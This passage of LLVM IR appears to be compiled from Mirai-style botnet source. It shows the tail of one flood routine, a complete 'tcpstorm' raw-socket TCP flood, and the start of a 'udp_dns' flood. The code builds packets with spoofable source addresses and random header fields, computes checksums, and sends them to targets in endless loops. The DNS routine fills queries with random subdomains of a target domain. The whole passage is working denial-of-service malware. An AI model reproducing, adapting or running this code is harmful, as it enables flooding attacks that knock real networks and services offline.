  %154 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %145, i32 1
  %155 = load i32, i32* %154, align 4
  %156 = call i32 @ntohl(i32 %155) #8
  %157 = call i32 @rand_next() #7
  %158 = load i32, i32* %5, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %159, i32 2
  %161 = load i8, i8* %160, align 4
  %162 = zext i8 %161 to i32
  %163 = lshr i32 %157, %162
  %164 = add i32 %163, %156
  %165 = call i32 @htonl(i32 %164) #8
  %166 = getelementptr inbounds i8, i8* %147, i64 16
  %167 = bitcast i8* %166 to i32*
  store i32 %165, i32* %167, align 4
  br label %168

; <label>:168:                                    ; preds = %153, %.lr.ph
  br i1 %67, label %169, label %173

; <label>:169:                                    ; preds = %168
  %170 = call i32 @rand_next() #7
  %171 = getelementptr inbounds i8, i8* %147, i64 12
  %172 = bitcast i8* %171 to i32*
  store i32 %170, i32* %172, align 4
  br label %173

; <label>:173:                                    ; preds = %169, %168
  br i1 %69, label %174, label %179

; <label>:174:                                    ; preds = %173
  %175 = call i32 @rand_next() #7
  %176 = trunc i32 %175 to i16
  %177 = getelementptr inbounds i8, i8* %147, i64 4
  %178 = bitcast i8* %177 to i16*
  store i16 %176, i16* %178, align 4
  br label %179

; <label>:179:                                    ; preds = %174, %173
  br i1 %71, label %180, label %184

; <label>:180:                                    ; preds = %179
  %181 = call i32 @rand_next() #7
  %182 = trunc i32 %181 to i16
  %183 = bitcast i8* %149 to i16*
  store i16 %182, i16* %183, align 4
  br label %184

; <label>:184:                                    ; preds = %180, %179
  br i1 %73, label %185, label %190

; <label>:185:                                    ; preds = %184
  %186 = call i32 @rand_next() #7
  %187 = trunc i32 %186 to i16
  %188 = getelementptr inbounds i8, i8* %147, i64 22
  %189 = bitcast i8* %188 to i16*
  store i16 %187, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %185, %184
  br i1 %74, label %191, label %195

; <label>:191:                                    ; preds = %190
  %192 = call i32 @rand_next() #7
  %193 = getelementptr inbounds i8, i8* %147, i64 24
  %194 = bitcast i8* %193 to i32*
  store i32 %192, i32* %194, align 4
  br label %195

; <label>:195:                                    ; preds = %191, %190
  br i1 %75, label %196, label %200

; <label>:196:                                    ; preds = %195
  %197 = call i32 @rand_next() #7
  %198 = getelementptr inbounds i8, i8* %147, i64 28
  %199 = bitcast i8* %198 to i32*
  store i32 %197, i32* %199, align 4
  br label %200

; <label>:200:                                    ; preds = %196, %195
  br i1 %76, label %206, label %201

; <label>:201:                                    ; preds = %200
  %202 = call i32 @rand_next() #7
  %203 = trunc i32 %202 to i16
  %204 = getelementptr inbounds i8, i8* %147, i64 38
  %205 = bitcast i8* %204 to i16*
  store i16 %203, i16* %205, align 2
  br label %206

; <label>:206:                                    ; preds = %200, %201
  %207 = getelementptr inbounds i8, i8* %147, i64 10
  %208 = bitcast i8* %207 to i16*
  store i16 0, i16* %208, align 2
  %209 = bitcast i8* %147 to i16*
  %210 = call zeroext i16 @checksum_generic(i16* %209, i32 20) #7
  store i16 %210, i16* %208, align 2
  %211 = getelementptr inbounds i8, i8* %147, i64 36
  %212 = bitcast i8* %211 to i16*
  store i16 0, i16* %212, align 4
  %213 = call zeroext i16 @htons(i16 zeroext 40) #8
  %214 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %148, i8* %149, i16 zeroext %213, i32 40) #7
  store i16 %214, i16* %212, align 4
  %215 = getelementptr inbounds i8, i8* %147, i64 22
  %216 = bitcast i8* %215 to i16*
  %217 = load i16, i16* %216, align 2
  %218 = load i32, i32* %5, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %219, i32 0, i32 1
  store i16 %217, i16* %220, align 2
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %219, i32 0
  %222 = bitcast %struct.sockaddr_in* %221 to %struct.sockaddr*
  %223 = call i64 @sendto(i32 %37, i8* %147, i64 60, i32 16384, %struct.sockaddr* %222, i32 16) #7
  %224 = load i32, i32* %5, align 4
  %225 = add nsw i32 %224, 1
  store i32 %225, i32* %5, align 4
  %226 = icmp slt i32 %225, %43
  br i1 %226, label %.lr.ph, label %.loopexit.loopexit

; <label>:227:                                    ; preds = %4, %64
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpstorm(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #7
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %216, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #7
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %68, label %.preheader124

.preheader124:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph126

.lr.ph126:                                        ; preds = %.preheader124
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = shl i16 %28, 11
  %57 = and i16 %56, 2048
  %58 = shl i16 %30, 10
  %59 = and i16 %58, 1024
  %60 = shl i16 %32, 9
  %61 = and i16 %60, 512
  %62 = shl i16 %34, 8
  %63 = and i16 %62, 256
  %64 = or i16 %53, %55
  %65 = or i16 %64, %57
  %66 = or i16 %65, %59
  %.masked = or i16 %66, %61
  %67 = or i16 %.masked, %63
  br label %86

; <label>:68:                                     ; preds = %42
  %69 = call i32 @close(i32 %40) #7
  br label %216

.preheader.loopexit:                              ; preds = %104
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader124
  %70 = icmp eq i8 %0, 0
  %71 = icmp eq i32 %39, -1
  %72 = and i32 %11, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = and i32 %17, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = and i32 %19, 65535
  %77 = icmp eq i32 %76, 65535
  %78 = icmp eq i32 %21, 65535
  %79 = icmp eq i32 %22, 65535
  %80 = icmp eq i8 %37, 0
  %81 = sext i32 %35 to i64
  %82 = add nsw i64 %81, 20
  %83 = trunc i64 %82 to i16
  %84 = trunc i64 %82 to i32
  %85 = add nsw i64 %81, 40
  br label %.loopexit

; <label>:86:                                     ; preds = %.lr.ph126, %104
  %87 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %88 = load i32, i32* %5, align 4
  %89 = sext i32 %88 to i64
  %90 = getelementptr inbounds i8*, i8** %8, i64 %89
  store i8* %87, i8** %90, align 8
  %91 = getelementptr inbounds i8, i8* %87, i64 20
  store i8 69, i8* %87, align 4
  %92 = getelementptr inbounds i8, i8* %87, i64 1
  store i8 %10, i8* %92, align 1
  %93 = call zeroext i16 @htons(i16 zeroext %49) #8
  %94 = getelementptr inbounds i8, i8* %87, i64 2
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  %96 = call zeroext i16 @htons(i16 zeroext %12) #8
  %97 = getelementptr inbounds i8, i8* %87, i64 4
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 4
  %99 = getelementptr inbounds i8, i8* %87, i64 8
  store i8 %14, i8* %99, align 4
  br i1 %50, label %104, label %100

; <label>:100:                                    ; preds = %86
  %101 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %102 = getelementptr inbounds i8, i8* %87, i64 6
  %103 = bitcast i8* %102 to i16*
  store i16 %101, i16* %103, align 2
  br label %104

; <label>:104:                                    ; preds = %86, %100
  %105 = getelementptr inbounds i8, i8* %87, i64 9
  store i8 6, i8* %105, align 1
  %106 = getelementptr inbounds i8, i8* %87, i64 12
  %107 = bitcast i8* %106 to i32*
  store i32 %39, i32* %107, align 4
  %108 = load i32, i32* %5, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %109, i32 1
  %111 = load i32, i32* %110, align 4
  %112 = getelementptr inbounds i8, i8* %87, i64 16
  %113 = bitcast i8* %112 to i32*
  store i32 %111, i32* %113, align 4
  %114 = call zeroext i16 @htons(i16 zeroext %18) #8
  %115 = bitcast i8* %91 to i16*
  store i16 %114, i16* %115, align 4
  %116 = call zeroext i16 @htons(i16 zeroext %20) #8
  %117 = getelementptr inbounds i8, i8* %87, i64 22
  %118 = bitcast i8* %117 to i16*
  store i16 %116, i16* %118, align 2
  %119 = call zeroext i16 @htons(i16 zeroext %51) #8
  %120 = zext i16 %119 to i32
  %121 = getelementptr inbounds i8, i8* %87, i64 24
  %122 = bitcast i8* %121 to i32*
  store i32 %120, i32* %122, align 4
  %123 = getelementptr inbounds i8, i8* %87, i64 32
  %124 = bitcast i8* %123 to i16*
  %125 = load i16, i16* %124, align 4
  %126 = and i16 %125, -16369
  %127 = or i16 %67, %126
  %128 = or i16 %127, 160
  store i16 %128, i16* %124, align 4
  %129 = call i32 @rand() #7
  %130 = srem i32 %129, 65535
  %131 = trunc i32 %130 to i16
  %132 = getelementptr inbounds i8, i8* %87, i64 34
  %133 = bitcast i8* %132 to i16*
  store i16 %131, i16* %133, align 2
  %134 = load i32, i32* %5, align 4
  %135 = add nsw i32 %134, 1
  store i32 %135, i32* %5, align 4
  %136 = icmp slt i32 %135, %46
  br i1 %136, label %86, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %195
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %70, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %195
  %storemerge117125 = phi i32 [ %214, %195 ], [ 0, %.lr.ph.preheader ]
  %137 = sext i32 %storemerge117125 to i64
  %138 = getelementptr inbounds i8*, i8** %8, i64 %137
  %139 = load i8*, i8** %138, align 8
  %140 = bitcast i8* %139 to %struct.iphdr*
  %141 = getelementptr inbounds i8, i8* %139, i64 20
  %142 = getelementptr inbounds i8, i8* %139, i64 40
  %143 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %137, i32 2
  %144 = load i8, i8* %143, align 4
  %145 = icmp ult i8 %144, 32
  br i1 %145, label %146, label %161

; <label>:146:                                    ; preds = %.lr.ph
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %137, i32 1
  %148 = load i32, i32* %147, align 4
  %149 = call i32 @ntohl(i32 %148) #8
  %150 = call i32 @rand_next() #7
  %151 = load i32, i32* %5, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %152, i32 2
  %154 = load i8, i8* %153, align 4
  %155 = zext i8 %154 to i32
  %156 = lshr i32 %150, %155
  %157 = add i32 %156, %149
  %158 = call i32 @htonl(i32 %157) #8
  %159 = getelementptr inbounds i8, i8* %139, i64 16
  %160 = bitcast i8* %159 to i32*
  store i32 %158, i32* %160, align 4
  br label %161

; <label>:161:                                    ; preds = %146, %.lr.ph
  br i1 %71, label %162, label %166

; <label>:162:                                    ; preds = %161
  %163 = call i32 @rand_next() #7
  %164 = getelementptr inbounds i8, i8* %139, i64 12
  %165 = bitcast i8* %164 to i32*
  store i32 %163, i32* %165, align 4
  br label %166

; <label>:166:                                    ; preds = %162, %161
  br i1 %73, label %167, label %172

; <label>:167:                                    ; preds = %166
  %168 = call i32 @rand_next() #7
  %169 = trunc i32 %168 to i16
  %170 = getelementptr inbounds i8, i8* %139, i64 4
  %171 = bitcast i8* %170 to i16*
  store i16 %169, i16* %171, align 4
  br label %172

; <label>:172:                                    ; preds = %167, %166
  br i1 %75, label %173, label %177

; <label>:173:                                    ; preds = %172
  %174 = call i32 @rand_next() #7
  %175 = trunc i32 %174 to i16
  %176 = bitcast i8* %141 to i16*
  store i16 %175, i16* %176, align 4
  br label %177

; <label>:177:                                    ; preds = %173, %172
  br i1 %77, label %178, label %183

; <label>:178:                                    ; preds = %177
  %179 = call i32 @rand_next() #7
  %180 = trunc i32 %179 to i16
  %181 = getelementptr inbounds i8, i8* %139, i64 22
  %182 = bitcast i8* %181 to i16*
  store i16 %180, i16* %182, align 2
  br label %183

; <label>:183:                                    ; preds = %178, %177
  br i1 %78, label %184, label %188

; <label>:184:                                    ; preds = %183
  %185 = call i32 @rand_next() #7
  %186 = getelementptr inbounds i8, i8* %139, i64 24
  %187 = bitcast i8* %186 to i32*
  store i32 %185, i32* %187, align 4
  br label %188

; <label>:188:                                    ; preds = %184, %183
  br i1 %79, label %189, label %193

; <label>:189:                                    ; preds = %188
  %190 = call i32 @rand_next() #7
  %191 = getelementptr inbounds i8, i8* %139, i64 28
  %192 = bitcast i8* %191 to i32*
  store i32 %190, i32* %192, align 4
  br label %193

; <label>:193:                                    ; preds = %189, %188
  br i1 %80, label %195, label %194

; <label>:194:                                    ; preds = %193
  call void @rand_str(i8* %142, i32 %35) #7
  br label %195

; <label>:195:                                    ; preds = %193, %194
  %196 = getelementptr inbounds i8, i8* %139, i64 10
  %197 = bitcast i8* %196 to i16*
  store i16 0, i16* %197, align 2
  %198 = bitcast i8* %139 to i16*
  %199 = call zeroext i16 @checksum_generic(i16* %198, i32 20) #7
  store i16 %199, i16* %197, align 2
  %200 = getelementptr inbounds i8, i8* %139, i64 36
  %201 = bitcast i8* %200 to i16*
  store i16 0, i16* %201, align 4
  %202 = call zeroext i16 @htons(i16 zeroext %83) #8
  %203 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %140, i8* %141, i16 zeroext %202, i32 %84) #7
  store i16 %203, i16* %201, align 4
  %204 = getelementptr inbounds i8, i8* %139, i64 22
  %205 = bitcast i8* %204 to i16*
  %206 = load i16, i16* %205, align 2
  %207 = load i32, i32* %5, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %208, i32 0, i32 1
  store i16 %206, i16* %209, align 2
  %210 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %208, i32 0
  %211 = bitcast %struct.sockaddr_in* %210 to %struct.sockaddr*
  %212 = call i64 @sendto(i32 %40, i8* %139, i64 %85, i32 16384, %struct.sockaddr* %211, i32 16) #7
  %213 = load i32, i32* %5, align 4
  %214 = add nsw i32 %213, 1
  store i32 %214, i32* %5, align 4
  %215 = icmp slt i32 %214, %46
  br i1 %215, label %.lr.ph, label %.loopexit.loopexit

; <label>:216:                                    ; preds = %4, %68
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %7 = trunc i32 %6 to i8
  %8 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %9 = trunc i32 %8 to i16
  %10 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %11 = trunc i32 %10 to i8
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %13 = trunc i32 %12 to i8
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %15 = trunc i32 %14 to i16
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 53)
  %17 = trunc i32 %16 to i16
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 9, i32 65535)
  %19 = trunc i32 %18 to i16
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1458)
  %21 = trunc i32 %20 to i8
  %22 = tail call i8* @attack_get_opt_str(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 8, i8* null)
  %23 = tail call fastcc i32 @get_dns_resolver()
  %24 = icmp eq i8* %22, null
  br i1 %24, label %190, label %25

; <label>:25:                                     ; preds = %4
  %26 = tail call i32 @util_strlen(i8* nonnull %22) #7
  %27 = tail call i32 @socket(i32 2, i32 3, i32 17) #7
  %28 = icmp eq i32 %27, -1
  br i1 %28, label %190, label %29

; <label>:29:                                     ; preds = %25
  store i32 1, i32* %5, align 4
  %30 = bitcast i32* %5 to i8*
  %31 = call i32 @setsockopt(i32 %27, i32 0, i32 3, i8* nonnull %30, i32 4) #7
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %47, label %.preheader121

.preheader121:                                    ; preds = %29
  store i32 0, i32* %5, align 4
  %33 = zext i8 %0 to i32
  %34 = icmp eq i8 %0, 0
  br i1 %34, label %.preheader, label %.lr.ph128

.lr.ph128:                                        ; preds = %.preheader121
  %.mask120 = and i32 %20, 255
  %35 = zext i32 %.mask120 to i64
  %36 = sext i32 %26 to i64
  %37 = add nuw nsw i64 %35, 47
  %38 = add nsw i64 %37, %36
  %39 = trunc i64 %38 to i16
  %40 = icmp eq i8 %13, 0
  %41 = add nuw nsw i64 %35, 27
  %42 = add nsw i64 %41, %36
  %43 = trunc i64 %42 to i16
  %44 = add nsw i32 %26, 1
  %45 = icmp sgt i32 %26, 0
  %wide.trip.count = zext i32 %26 to i64
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  %46 = icmp eq i32 %26, 1
  br label %64

; <label>:47:                                     ; preds = %29
  %48 = call i32 @close(i32 %27) #7
  br label %190

.preheader.loopexit:                              ; preds = %._crit_edge
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader121
  %49 = icmp eq i8 %0, 0
  %50 = and i32 %8, 65535
  %51 = icmp eq i32 %50, 65535
  %52 = and i32 %14, 65535
  %53 = icmp eq i32 %52, 65535
  %54 = and i32 %16, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = and i32 %18, 65535
  %57 = icmp eq i32 %56, 65535
  %58 = and i32 %20, 255
  %59 = sext i32 %26 to i64
  %60 = add nuw nsw i32 %58, 27
  %61 = add i32 %60, %26
  %addconv130 = add nuw nsw i32 %58, 47
  %62 = zext i32 %addconv130 to i64
  %63 = add nsw i64 %62, %59
  br label %.loopexit

; <label>:64:                                     ; preds = %.lr.ph128, %._crit_edge
  %65 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %66 = getelementptr inbounds i8, i8* %65, i64 20
  %67 = getelementptr inbounds i8, i8* %65, i64 28
  %68 = getelementptr inbounds i8, i8* %65, i64 40
  store i8 69, i8* %65, align 4
  %69 = getelementptr inbounds i8, i8* %65, i64 1
  store i8 %7, i8* %69, align 1
  %70 = call zeroext i16 @htons(i16 zeroext %39) #8
  %71 = getelementptr inbounds i8, i8* %65, i64 2
  %72 = bitcast i8* %71 to i16*
  store i16 %70, i16* %72, align 2
  %73 = call zeroext i16 @htons(i16 zeroext %9) #8
  %74 = getelementptr inbounds i8, i8* %65, i64 4
  %75 = bitcast i8* %74 to i16*
  store i16 %73, i16* %75, align 4
  %76 = getelementptr inbounds i8, i8* %65, i64 8
  store i8 %11, i8* %76, align 4
  br i1 %40, label %81, label %77

; <label>:77:                                     ; preds = %64
  %78 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %79 = getelementptr inbounds i8, i8* %65, i64 6
  %80 = bitcast i8* %79 to i16*
  store i16 %78, i16* %80, align 2
  br label %81

; <label>:81:                                     ; preds = %64, %77
  %82 = getelementptr inbounds i8, i8* %65, i64 9
  store i8 17, i8* %82, align 1
  %83 = load i32, i32* @LOCAL_ADDR, align 4
  %84 = getelementptr inbounds i8, i8* %65, i64 12
  %85 = bitcast i8* %84 to i32*
  store i32 %83, i32* %85, align 4
  %86 = getelementptr inbounds i8, i8* %65, i64 16
  %87 = bitcast i8* %86 to i32*
  store i32 %23, i32* %87, align 4
  %88 = call zeroext i16 @htons(i16 zeroext %15) #8
  %89 = bitcast i8* %66 to i16*
  store i16 %88, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %17) #8
  %91 = getelementptr inbounds i8, i8* %65, i64 22
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 2
  %93 = call zeroext i16 @htons(i16 zeroext %43) #8
  %94 = getelementptr inbounds i8, i8* %65, i64 24
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  %96 = call zeroext i16 @htons(i16 zeroext %19) #8
  %97 = bitcast i8* %67 to i16*
  store i16 %96, i16* %97, align 2
  %98 = call zeroext i16 @htons(i16 zeroext 256) #8
  %99 = getelementptr inbounds i8, i8* %65, i64 30
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 2
  %101 = call zeroext i16 @htons(i16 zeroext 1) #8
  %102 = getelementptr inbounds i8, i8* %65, i64 32
  %103 = bitcast i8* %102 to i16*
  store i16 %101, i16* %103, align 2
  %104 = getelementptr inbounds i8, i8* %65, i64 41
  store i8 %21, i8* %68, align 1
  %105 = getelementptr inbounds i8, i8* %104, i64 %35
  %106 = getelementptr inbounds i8, i8* %105, i64 1
  call void @util_memcpy(i8* %106, i8* nonnull %22, i32 %44) #7
  br i1 %45, label %.lr.ph126.preheader, label %._crit_edge

.lr.ph126.preheader:                              ; preds = %81
  br i1 %lcmp.mod, label %.lr.ph126.prol.loopexit.unr-lcssa, label %.lr.ph126.prol.preheader

.lr.ph126.prol.preheader:                         ; preds = %.lr.ph126.preheader
  br label %.lr.ph126.prol

.lr.ph126.prol:                                   ; preds = %.lr.ph126.prol.preheader
  %107 = load i8, i8* %22, align 1
  %108 = icmp eq i8 %107, 46
  br i1 %108, label %110, label %109

; <label>:109:                                    ; preds = %.lr.ph126.prol
  br label %112

; <label>:110:                                    ; preds = %.lr.ph126.prol
  store i8 0, i8* %105, align 1
  %111 = getelementptr inbounds i8, i8* %105, i64 1
  br label %112

; <label>:112:                                    ; preds = %110, %109
  %.1118.prol = phi i8* [ %111, %110 ], [ %105, %109 ]
  %.1.prol = phi i8 [ 0, %110 ], [ 1, %109 ]
  br label %.lr.ph126.prol.loopexit.unr-lcssa

.lr.ph126.prol.loopexit.unr-lcssa:                ; preds = %.lr.ph126.preheader, %112
  %.1118.lcssa.unr.ph = phi i8* [ %.1118.prol, %112 ], [ undef, %.lr.ph126.preheader ]
  %.1.lcssa.unr.ph = phi i8 [ %.1.prol, %112 ], [ undef, %.lr.ph126.preheader ]
  %indvars.iv.unr.ph = phi i64 [ 1, %112 ], [ 0, %.lr.ph126.preheader ]
  %.0114124.unr.ph = phi i8 [ %.1.prol, %112 ], [ 0, %.lr.ph126.preheader ]
  %.0117122.unr.ph = phi i8* [ %.1118.prol, %112 ], [ %105, %.lr.ph126.preheader ]
  br label %.lr.ph126.prol.loopexit

.lr.ph126.prol.loopexit:                          ; preds = %.lr.ph126.prol.loopexit.unr-lcssa
  br i1 %46, label %._crit_edge.loopexit, label %.lr.ph126.preheader.new

.lr.ph126.preheader.new:                          ; preds = %.lr.ph126.prol.loopexit
  br label %.lr.ph126

.lr.ph126:                                        ; preds = %196, %.lr.ph126.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr.ph, %.lr.ph126.preheader.new ], [ %indvars.iv.next.1, %196 ]
  %.0114124 = phi i8 [ %.0114124.unr.ph, %.lr.ph126.preheader.new ], [ %.1.1, %196 ]
  %.0117122 = phi i8* [ %.0117122.unr.ph, %.lr.ph126.preheader.new ], [ %.1118.1, %196 ]
  %113 = getelementptr inbounds i8, i8* %22, i64 %indvars.iv
  %114 = load i8, i8* %113, align 1
  %115 = icmp eq i8 %114, 46
  br i1 %115, label %116, label %119

; <label>:116:                                    ; preds = %.lr.ph126
  store i8 %.0114124, i8* %.0117122, align 1
  %117 = getelementptr inbounds i8, i8* %105, i64 %indvars.iv
  %118 = getelementptr inbounds i8, i8* %117, i64 1
  br label %.lr.ph126.1131

; <label>:119:                                    ; preds = %.lr.ph126
  %120 = add i8 %.0114124, 1
  br label %.lr.ph126.1131

.lr.ph126.1131:                                   ; preds = %116, %119
  %.1118 = phi i8* [ %118, %116 ], [ %.0117122, %119 ]
  %.1 = phi i8 [ 0, %116 ], [ %120, %119 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %121 = getelementptr inbounds i8, i8* %22, i64 %indvars.iv.next
  %122 = load i8, i8* %121, align 1
  %123 = icmp eq i8 %122, 46
  br i1 %123, label %193, label %191

._crit_edge.loopexit.unr-lcssa:                   ; preds = %196
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph126.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.1118.lcssa = phi i8* [ %.1118.lcssa.unr.ph, %.lr.ph126.prol.loopexit ], [ %.1118.1, %._crit_edge.loopexit.unr-lcssa ]
  %.1.lcssa = phi i8 [ %.1.lcssa.unr.ph, %.lr.ph126.prol.loopexit ], [ %.1.1, %._crit_edge.loopexit.unr-lcssa ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %81
  %.0117.lcssa = phi i8* [ %105, %81 ], [ %.1118.lcssa, %._crit_edge.loopexit ]
  %.0114.lcssa = phi i8 [ 0, %81 ], [ %.1.lcssa, %._crit_edge.loopexit ]
  store i8 %.0114.lcssa, i8* %.0117.lcssa, align 1
  %124 = getelementptr inbounds i8, i8* %105, i64 %36
  %125 = getelementptr inbounds i8, i8* %124, i64 2
  %126 = bitcast i8* %125 to i16*
  store i16 %101, i16* %126, align 2
  %127 = getelementptr inbounds i8, i8* %125, i64 2
  %128 = bitcast i8* %127 to i16*
  store i16 %101, i16* %128, align 2
  %129 = load i32, i32* %5, align 4
  %130 = add nsw i32 %129, 1
  store i32 %130, i32* %5, align 4
  %131 = icmp slt i32 %130, %33
  br i1 %131, label %64, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %162
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %49, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %162
  %132 = call i32 @rand() #7
  %133 = srem i32 %132, 256
  %134 = sext i32 %133 to i64
